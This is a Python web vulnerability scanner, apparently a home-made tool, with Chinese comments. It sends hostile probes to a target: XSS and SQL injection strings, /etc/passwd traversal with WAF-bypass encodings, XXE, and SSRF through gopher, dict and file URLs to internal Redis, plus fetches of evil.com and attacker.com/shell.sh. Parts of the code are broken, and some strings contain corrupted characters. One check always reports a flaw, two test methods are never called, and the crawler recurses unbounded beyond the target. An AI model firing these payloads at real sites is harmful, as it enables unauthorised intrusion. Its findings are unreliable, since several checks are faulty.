import base64
import ssl
import requests
import threading
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import argparse
import json
from datetime import datetime
import sys
import uuid

# 定义颜色代码
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class NiketoScanner:
    def __init__(self, base_url, threads=10, verify_ssl=True, timeout=10, tls_version=None):
        self.base_url = base_url
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'evilginx-hackerone/Scanner/1.0'})
        self.session.verify = verify_ssl
        self.timeout = timeout
        self.found_urls = set()
        self.vulnerabilities = []
        
        # 配置TLS协议版本
        if tls_version:
            self.session.mount('https://', requests.adapters.HTTPAdapter( # type: ignore
                max_retries=3,
                ssl_version=getattr(ssl, f'PROTOCOL_{tls_version.upper()}')
            ))

    def scan(self):
        """主扫描方法"""
        self.check_server_info()
        self.crawl_links()
        self.test_vulnerabilities()
        self.generate_report()

    def check_server_info(self):
        """检查服务器信息"""
        try:
            response = self.session.head(self.base_url)
            server = response.headers.get('Server', '未知')
            print(f"{Colors.OKGREEN}+ {Colors.ENDC}服务器信息: {Colors.BOLD}{server}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}+ {Colors.ENDC}检测到HTTP方法: {Colors.BOLD}{', '.join(response.headers.get('Allow', '未知').split(','))}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}获取服务器信息失败: {e}")

    def is_valid_url(self, url):
        """验证URL是否有效，过滤掉伪协议等无效URL"""
        if not url:
            return False
        
        # 过滤掉javascript:等伪协议
        if url.lower().startswith(('javascript:', 'data:', 'about:', 'mailto:')):
            return False
            
        # 只允许http/https协议
        return url.startswith(('http://', 'https://'))
        
    def crawl_links(self, url=None):
        """递归爬取网站链接"""
        current_url = url if url else self.base_url
        try:
            # 确保URL包含scheme
            if not current_url.startswith(('http://', 'https://')):
                current_url = 'https://' + current_url
                
            # 验证URL有效性
            if not self.is_valid_url(current_url):
                return
                
            try:
                response = self.session.get(current_url, timeout=self.timeout)
            except requests.exceptions.SSLError as e:
                print(f"{Colors.WARNING}* {Colors.ENDC}SSL错误: {e}")
                print(f"{Colors.WARNING}* {Colors.ENDC}尝试关闭证书验证")
                self.session.verify = False
                try:
                    response = self.session.get(current_url, timeout=self.timeout)
                except Exception as e:
                    print(f"{Colors.FAIL}- {Colors.ENDC}连接失败: {e}")
                    return
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                full_url = urljoin(current_url, link['href'])
                # 确保生成的URL包含scheme
                if not full_url.startswith(('http://', 'https://')):
                    full_url = 'https://' + full_url
                    
                if full_url not in self.found_urls:
                    self.found_urls.add(full_url)
                    print(f"[+] 发现链接: {full_url}")
                    # 对每个发现的URL立即执行漏洞测试
                    self.base_url = full_url
                    self.test_vulnerabilities()
                    # 递归爬取
                    self.crawl_links(full_url)
            
            # 恢复原始base_url
            if url:
                self.base_url = current_url
        except Exception as e:
            print(f"[-] 爬取链接失败({current_url}): {e}")

    def test_vulnerabilities(self):
        """测试常见漏洞"""
        # 这里可以添加更多漏洞检测逻辑
        self.test_xss()
        self.test_sqli()
        self.test_headers()
        self.test_csrf()
        self.test_directory_traversal()
        self.test_cookie_issues()
        self.test_crlf_injection()
        self.test_sensitive_info()
        self.test_ssrf()
        self.test_xxe()
        self.test_jwt()
        self.test_api_security()
        
        # 每次测试完立即更新报告
        self.generate_report()

    def test_xss(self):
        """测试XSS漏洞"""
        test_url = urljoin(self.base_url, "/search?q=<script>alert(1)</script>")
        # 确保URL包含scheme
        if not test_url.startswith(('http://', 'https://')):
            test_url = 'https://' + test_url
            
        # 验证URL有效性
        if not self.is_valid_url(test_url):
            return
        try:
            response = self.session.get(test_url)
            if "<script>alert(1)</script>" in response.text:
                self.vulnerabilities.append({
                    'type': 'XSS',
                    'url': test_url,
                    'severity': 'high',
                    'description': '反射型XSS漏洞，攻击者可以注入任意JavaScript代码'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现XSS漏洞{Colors.ENDC}: {test_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 反射型XSS漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}XSS测试失败: {e}")

    def test_sqli(self):
        """测试SQL注入漏洞"""
        test_url = urljoin(self.base_url, "/search?q=1' OR '1'='1")
        # 确保URL包含scheme
        if not test_url.startswith(('http://', 'https://')):
            test_url = 'https://' + test_url
            
        # 验证URL有效性
        if not self.is_valid_url(test_url):
            return
        try:
            response = self.session.get(test_url)
            if "error in your SQL syntax" in response.text.lower():
                self.vulnerabilities.append({
                    'type': 'SQL Injection',
                    'url': test_url,
                    'severity': 'critical',
                    'description': 'SQL注入漏洞，攻击者可以操纵数据库查询'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现SQL注入漏洞{Colors.ENDC}: {test_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: SQL注入漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}严重{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}SQL注入测试失败: {e}")
            
    def test_headers(self):
        """测试HTTP标头安全性"""
        # 验证URL有效性
        if not self.is_valid_url(self.base_url):
            return
            
        try:
            response = self.session.head(self.base_url)
            headers = response.headers
            
            # 检查缺失的安全标头
            missing_headers = []
            security_headers = [
                'Content-Security-Policy',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Referrer-Policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)
            
            if missing_headers:
                self.vulnerabilities.append({
                    'type': 'Missing Security Headers',
                    'url': self.base_url,
                    'severity': 'medium',
                    'description': f'缺少以下安全标头: {", ".join(missing_headers)}'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现缺失的安全标头{Colors.ENDC}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 缺少以下安全标头: {Colors.BOLD}{', '.join(missing_headers)}{Colors.ENDC}")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
            
            # 检查不安全的标头配置
            if 'Server' in headers and headers['Server'].lower() == 'apache':
                self.vulnerabilities.append({
                    'type': 'Information Disclosure',
                    'url': self.base_url,
                    'severity': 'low',
                    'description': '服务器信息泄露: Apache版本信息'
                })
                print(f"{Colors.WARNING}! {Colors.ENDC}{Colors.BOLD}发现服务器信息泄露{Colors.ENDC}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 服务器暴露了Apache版本信息")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.OKBLUE}低危{Colors.ENDC}")
                
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}标头测试失败: {e}")
            
    def test_csrf(self):
        """测试CSRF漏洞"""
        # 验证URL有效性
        if not self.is_valid_url(self.base_url):
            return
            
        try:
            response = self.session.get(self.base_url)
            if 'Set-Cookie' in response.headers and 'SameSite' not in response.headers['Set-Cookie']:
                self.vulnerabilities.append({
                    'type': 'CSRF',
                    'url': self.base_url,
                    'severity': 'medium',
                    'description': 'Cookie缺少SameSite属性，可能导致CSRF攻击'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现CSRF漏洞{Colors.ENDC}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: Cookie缺少SameSite属性")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}CSRF测试失败: {e}")
            
    def test_directory_traversal(self):
        """测试目录遍历漏洞，包括绕过WAF的技术"""
        # 基本路径穿越测试
        test_urls = [
            urljoin(self.base_url, "/../../etc/passwd"),  # 基本路径穿越
            urljoin(self.base_url, "/..%2f..%2fetc%2fpasswd"),  # URL编码
            urljoin(self.base_url, "/..%252f..%252fetc%252fpasswd"),  # 双重URL编码
            urljoin(self.base_url, "/..\\..\\etc\\passwd"),  # 反斜杠
            urljoin(self.base_url, "/%2e%2e/%2e%2e/etc/passwd"),  # 点编码
            urljoin(self.base_url, "/..%00/etc/passwd"),  # 空字节注入
            urljoin(self.base_url, "/....//etc/passwd"),  # 点扩展
            urljoin(self.base_url, "/%2e%2e%2fetc%2fpasswd")  # 混合编码
        ]
        
        for test_url in test_urls:
            # 确保URL包含scheme
            if not test_url.startswith(('http://', 'https://')):
                test_url = 'https://' + test_url
                
            # 验证URL有效性
            if not self.is_valid_url(test_url):
                continue
            try:
                response = self.session.get(test_url)
                if "root:" in response.text:
                    self.vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'severity': 'high',
                        'description': f'目录遍历漏洞(绕过技术: {test_url.split("/")[-2]}), 攻击者可以访问系统敏感文件'
                    })
                    print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现目录遍历漏洞{Colors.ENDC}: {test_url}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 目录遍历漏洞(绕过技术: {test_url.split('/')[-2]})")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}- {Colors.ENDC}目录遍历测试失败({test_url}): {e}")
            
    def test_cookie_issues(self):
        """测试cookie相关漏洞"""
        try:
            response = self.session.get(self.base_url)
            cookies = response.cookies
            
            # 检测cookie破坏漏洞
            for cookie in cookies:
                if not cookie.secure and 'https' in self.base_url:
                    self.vulnerabilities.append({
                        'type': 'Cookie Security',
                        'url': self.base_url,
                        'severity': 'medium',
                        'description': f'Cookie {cookie.name}未设置Secure标志，可能导致信息泄露'
                    })
                    print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现Cookie安全漏洞{Colors.ENDC}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: Cookie {cookie.name}未设置Secure标志")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
                
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    self.vulnerabilities.append({
                        'type': 'Cookie Security',
                        'url': self.base_url,
                        'severity': 'medium',
                        'description': f'Cookie {cookie.name}未设置HttpOnly标志，可能导致XSS攻击'
                    })
                    print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现Cookie安全漏洞{Colors.ENDC}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: Cookie {cookie.name}未设置HttpOnly标志")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
            
            # 检测会话固定漏洞
            if 'Set-Cookie' in response.headers and 'JSESSIONID' in response.headers['Set-Cookie']:
                self.vulnerabilities.append({
                    'type': 'Session Fixation',
                    'url': self.base_url,
                    'severity': 'medium',
                    'description': '检测���可能的会话固定漏洞，JSESSIONID未在登录后重新生成'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现会话固定漏洞{Colors.ENDC}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: JSESSIONID未在登录后重新生成")
                print(f"{Colors.WARNING}* {Colors.ENDC}���险等级: {Colors.WARNING}中危{Colors.ENDC}")
                
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}Cookie测试失败: {e}")
            
    def test_crlf_injection(self):
        """测试CRLF注入漏洞"""
        test_url = urljoin(self.base_url, "/%0D%0ALocation:%20http://evil.com")
        # 确保URL包含scheme
        if not test_url.startswith(('http://', 'https://')):
            test_url = 'https://' + test_url
        try:
            response = self.session.get(test_url)
            if 'Location: http://evil.com' in response.headers:
                self.vulnerabilities.append({
                    'type': 'CRLF Injection',
                    'url': test_url,
                    'severity': 'medium',
                    'description': 'CRLF注入漏洞，攻击者可以注入任意HTTP头'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现CRLF注入漏洞{Colors.ENDC}: {test_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: CRLF注入漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}CRLF注入测试失败: {e}")
            
    def test_sensitive_info(self):
        """测试敏感信息泄露"""
        sensitive_paths = [
            '/.git/config',
            '/.env',
            '/config/database.yml',
            '/WEB-INF/web.xml',
            '/phpinfo.php',
            '/server-status',  # Apache状态页面
            '/status',  # Nginx状态页面
            '/manager/html',  # Tomcat管理后台
            '/wp-admin',  # WordPress管理后台
            '/admin',  # 通用管理后台
            '/phpmyadmin',  # phpMyAdmin
            '/.svn/entries',  # SVN信息泄露
            '/.hg/store'  # Mercurial信息泄露
        ]
        
        for path in sensitive_paths:
            test_url = urljoin(self.base_url, path)
            # 确保URL包含scheme
            if not test_url.startswith(('http://', 'https://')):
                test_url = 'https://' + test_url
            try:
                response = self.session.get(test_url)
                if response.status_code == 200 and len(response.text) > 0:
                    self.vulnerabilities.append({
                        'type': 'Sensitive Information',
                        'url': test_url,
                        'severity': 'high',
                        'description': f'发现敏感文件泄露: {path}'
                    })
                    print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现敏感文件泄露{Colors.ENDC}: {test_url}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 发现敏感文件 {path}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}- {Colors.ENDC}敏感文件测试失败({path}): {e}")
                
    def test_ssrf(self):
        """测试SSRF漏洞"""
        # 测试Gopher协议
        gopher_url = urljoin(self.base_url, "/api/fetch?url=gopher://127.0.0.1:6379/_info")
        try:
            response = self.session.get(gopher_url)
            if "redis_version" in response.text:
                self.vulnerabilities.append({
                    'type': 'SSRF (Gopher)',
                    'url': gopher_url,
                    'severity': 'critical',
                    'description': 'Gopher协议SSRF漏洞，攻击者可访问内部Redis服务'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现Gopher协议SSRF漏洞{Colors.ENDC}: {gopher_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: Gopher协议SSRF漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}严重{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}Gopher协议SSRF测试失败: {e}")
            
        # 测试本地DNS解析
        local_dns_url = urljoin(self.base_url, f"/api/fetch?url=http://{str(uuid.uuid4())}.localhost")
        try:
            response = self.session.get(local_dns_url)
            if "localhost" in response.text:
                self.vulnerabilities.append({
                    'type': 'SSRF (Local DNS)',
                    'url': local_dns_url,
                    'severity': 'high',
                    'description': '本地DNS解析漏洞，攻击者可探测内部网络'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现本地DNS解析漏洞{Colors.ENDC}: {local_dns_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 本地DNS解析漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}本地DNS解析测试失败: {e}")
            
        # 测试File协议
        file_url = urljoin(self.base_url, "/api/fetch?url=file:///etc/passwd")
        try:
            response = self.session.get(file_url)
            if "root:" in response.text:
                self.vulnerabilities.append({
                    'type': 'SSRF (File)',
                    'url': file_url,
                    'severity': 'critical',
                    'description': 'File协议SSRF漏洞，攻击者可读取系统敏感文件'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现File协议SSRF漏洞{Colors.ENDC}: {file_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: File协议SSRF漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}严重{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}File协议SSRF测试失败: {e}")
            
        # 测试Dict协议
        dict_url = urljoin(self.base_url, "/api/fetch?url=dict://127.0.0.1:6379/info")
        try:
            response = self.session.get(dict_url)
            if "redis_version" in response.text:
                self.vulnerabilities.append({
                    'type': 'SSRF (Dict)',
                    'url': dict_url,
                    'severity': 'critical',
                    'description': 'Dict协议SSRF漏洞，攻击者可访问内部Redis服务'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现Dict协议SSRF漏洞{Colors.ENDC}: {dict_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: Dict协议SSRF漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}严重{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}Dict协议SSRF测试失败: {e}")
            
        # 测试DNS协议
        dns_url = urljoin(self.base_url, f"/api/fetch?url=http://{str(uuid.uuid4())}.attacker.com")
        try:
            response = self.session.get(dns_url)
            self.vulnerabilities.append({
                'type': 'SSRF (DNS)',
                'url': dns_url,
                'severity': 'medium',
                'description': 'DNS协议SSRF漏洞，攻击者可进行DNS查询'
            })
            print(f"{Colors.WARNING}! {Colors.ENDC}{Colors.BOLD}发现DNS协议SSRF漏洞{Colors.ENDC}: {dns_url}")
            print(f"{Colors.WARNING}* {Colors.ENDC}漏���描述: DNS协议SSRF漏洞")
            print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}DNS协议SSRF测试失败: {e}")
            
        # 测试HTTP协议
        http_url = urljoin(self.base_url, "/api/fetch?url=http://attacker.com/shell.sh")
        try:
            response = self.session.get(http_url)
            if "bash" in response.text:
                self.vulnerabilities.append({
                    'type': 'SSRF (HTTP)',
                    'url': http_url,
                    'severity': 'high',
                    'description': 'HTTP协议SSRF漏洞，攻击者可下载并执行恶意脚本'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现HTTP协议SSRF漏洞{Colors.ENDC}: {http_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: HTTP协议SSRF漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}HTTP协议SSRF测试失败: {e}")
            
    def test_file_inclusion(self):
        """测试文件包含漏洞"""
        # 测试路径遍历
        traversal_paths = [
            '/../../etc/passwd',
            '/..%2f..%2f..%2fetc/passwd',
            '/..\\..\\..\\etc/passwd'
        ]
        
        for path in traversal_paths:
            test_url = urljoin(self.base_url, path)
            if not test_url.startswith(('http://', 'https://')):
                test_url = 'https://' + test_url
            try:
                response = self.session.get(test_url)
                if "root:" in response.text:
                    self.vulnerabilities.append({
                        'type': 'File Inclusion',
                        'url': test_url,
                        'severity': 'high',
                        'description': f'路径遍历漏洞，攻击者可访问系统敏感文件: {path}'
                    })
                    print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现文件包含漏洞{Colors.ENDC}: {test_url}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 路径遍历漏洞")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}- {Colors.ENDC}路径遍历测试失败({path}): {e}")
        
        # 测试PHP文件包含
        php_paths = [
            '/index.php?page=/etc/passwd',
            '/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd'
        ]
        
        for path in php_paths:
            test_url = urljoin(self.base_url, path)
            if not test_url.startswith(('http://', 'https://')):
                test_url = 'https://' + test_url
            try:
                response = self.session.get(test_url)
                if "root:" in response.text or "dGVzdA==" in response.text:
                    self.vulnerabilities.append({
                        'type': 'File Inclusion',
                        'url': test_url,
                        'severity': 'high',
                        'description': f'PHP文件包含漏洞，攻击者可读取系统文件: {path}'
                    })
                    print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现PHP文件包含漏洞{Colors.ENDC}: {test_url}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: PHP文件包含漏洞")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}- {Colors.ENDC}PHP文件包含测试失败({path}): {e}")

    def test_xxe(self):
        """测试XXE漏洞"""
        xml_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/xml-api"),
                data=xml_payload,
                headers={'Content-Type': 'application/xml'}
            )
            if "root:" in response.text:
                self.vulnerabilities.append({
                    'type': 'XXE',
                    'url': self.base_url + "/xml-api",
                    'severity': 'critical',
                    'description': 'XML外部实体注入漏洞，攻击者可读取系统文件'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现XXE漏洞{Colors.ENDC}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: XML外部实体注入漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}严重{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}XXE测试失败: {e}")
            
    def test_jwt(self):
        """测试JWT安全问题"""
        try:
            response = self.session.get(self.base_url)
            cookies = response.cookies
            
            for cookie in cookies:
                if cookie.name.lower() == 'jwt' or cookie.name.lower() == 'token':
                    parts = cookie.value.split('.') # type: ignore
                    if len(parts) != 3:
                        continue
                    
                    # 检查JWT算法
                    if parts[0] == 'eyJhbGciOiJub25eIn0':  # alg: none
                        self.vulnerabilities.append({
                            'type': 'JWT Security',
                            'url': self.base_url,
                            'severity': 'critical',
                            'description': 'JWT使用none算法，可被篡改'
                        })
                        print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现JWT安全漏洞{Colors.ENDC}")
                        print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: JWT使用none算法")
                        print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}严重{Colors.ENDC}")
                    
                    # 检查JWT过期时间
                    try:
                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8'))
                        if 'exp' not in payload:
                            self.vulnerabilities.append({
                                'type': 'JWT Security',
                                'url': self.base_url,
                                'severity': 'medium',
                                'description': 'JWT未设置过期时间，可能导致会话劫持'
                            })
                            print(f"{Colors.WARNING}! {Colors.ENDC}{Colors.BOLD}发现JWT安全漏洞{Colors.ENDC}")
                            print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: JWT未设置过期时间")
                            print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
                    except:
                        pass
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}JWT测试失败: {e}")
            
    def test_api_security(self):
        """测试API安全配置错误"""
        api_paths = ['/api', '/graphql', '/rest', '/v1', '/v2']
        
        for path in api_paths:
            test_url = urljoin(self.base_url, path)
            try:
                response = self.session.options(test_url)
                if 'OPTIONS' in response.headers.get('Allow', ''):
                    self.vulnerabilities.append({
                        'type': 'API Security',
                        'url': test_url,
                        'severity': 'medium',
                        'description': f'API端点 {path} 启用了OPTIONS方法，可能泄露敏感信息'
                    })
                    print(f"{Colors.WARNING}! {Colors.ENDC}{Colors.BOLD}发现API安全配置错误{Colors.ENDC}: {test_url}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: API端点启用了OPTIONS方法")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
                
                # 检查缺少速率限制
                for _ in range(10):
                    self.session.get(test_url)
                
                response = self.session.get(test_url)
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'API Security',
                        'url': test_url,
                        'severity': 'medium',
                        'description': f'API端点 {path} 缺少速率限制，可能导致暴力破解'
                    })
                    print(f"{Colors.WARNING}! {Colors.ENDC}{Colors.BOLD}发现API安全配置错误{Colors.ENDC}: {test_url}")
                    print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: API端点缺少速率限制")
                    print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}- {Colors.ENDC}API安全测试失败({path}): {e}")
                
    def test_redirect(self):
        """测试重定向漏洞"""
        # 常见重定向参数
        redirect_params = [
            'url', 'redirect', 'next', 'target', 'rurl', 'dest', 'destination',
            'redir', 'redirect_uri', 'redirect_url', 'return', 'returnTo',
            'return_to', 'checkout_url', 'continue', 'data', 'link', 'goto'
        ]
        
        # 测试开放重定向
        for param in redirect_params:
            test_url = urljoin(self.base_url, f"?{param}=http://evil.com")
            try:
                response = self.session.get(test_url, allow_redirects=False)
                if response.status_code in (301, 302, 303, 307, 308):
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location:
                        self.vulnerabilities.append({
                            'type': 'Open Redirect',
                            'url': test_url,
                            'severity': 'medium',
                            'description': f'开放重定向漏洞(参数: {param}), 攻击者可重定向用户到恶意网站'
                        })
                        print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现开放重定向漏洞{Colors.ENDC}: {test_url}")
                        print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: 通过参数 {param} 可重定向到外部网站")
                        print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.WARNING}中危{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}- {Colors.ENDC}开放重定向测试失败({param}): {e}")
        
        # 测试JavaScript重定向
        js_redirect_url = urljoin(self.base_url, "/redirect?url=javascript:alert(1)")
        try:
            response = self.session.get(js_redirect_url, allow_redirects=False)
            location = response.headers.get('Location', '')
            if location.lower().startswith('javascript:'):
                self.vulnerabilities.append({
                    'type': 'JavaScript Redirect',
                    'url': js_redirect_url,
                    'severity': 'high',
                    'description': 'JavaScript重定向漏洞，攻击者可执行任意JavaScript代码'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现JavaScript重定向漏洞{Colors.ENDC}: {js_redirect_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: JavaScript重定向漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}JavaScript重定向测试失败: {e}")
        
        # 测试HTTP头注入重定向
        header_inject_url = urljoin(self.base_url, "/%0D%0ALocation: http://evil.com")
        try:
            response = self.session.get(header_inject_url, allow_redirects=False)
            if 'Location: http://evil.com' in response.headers:
                self.vulnerabilities.append({
                    'type': 'Header Injection Redirect',
                    'url': header_inject_url,
                    'severity': 'high',
                    'description': 'HTTP头注入重定向漏洞，攻击者可注入任意重定向头'
                })
                print(f"{Colors.FAIL}! {Colors.ENDC}{Colors.BOLD}发现HTTP头注入重定向漏洞{Colors.ENDC}: {header_inject_url}")
                print(f"{Colors.WARNING}* {Colors.ENDC}漏洞描述: HTTP头注入重定向漏洞")
                print(f"{Colors.WARNING}* {Colors.ENDC}风险等级: {Colors.FAIL}高危{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}HTTP头注入重定向测试失败: {e}")

    def generate_report(self):
        """生成报告"""
        try:
            with open('evil.html', 'w') as f:
                f.write('<html><head><title>GuardEye扫描报告</title></head><body>')
                f.write(f'<h1>GuardEye扫描报告 - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</h1>')
                f.write(f'<h2>目标URL: {self.base_url}</h2>')
                
                if self.vulnerabilities:
                    f.write('<h3>发现的漏洞:</h3><ul>')
                    for vuln in self.vulnerabilities:
                        f.write(f'<li><strong>{vuln["type"]}</strong> - {vuln["description"]} (风险等级: {vuln["severity"]})</li>')
                    f.write('</ul>')
                else:
                    f.write('<p>未发现任何漏洞</p>')
                
                f.write('</body></html>')
                print(f"{Colors.OKGREEN}+ {Colors.ENDC}报告已保存到evil.html")
        except Exception as e:
            print(f"{Colors.FAIL}- {Colors.ENDC}保存报告失败: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='GuardEye Web Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    args = parser.parse_args()
    
    scanner = NiketoScanner(args.url, args.threads)
    scanner.scan()
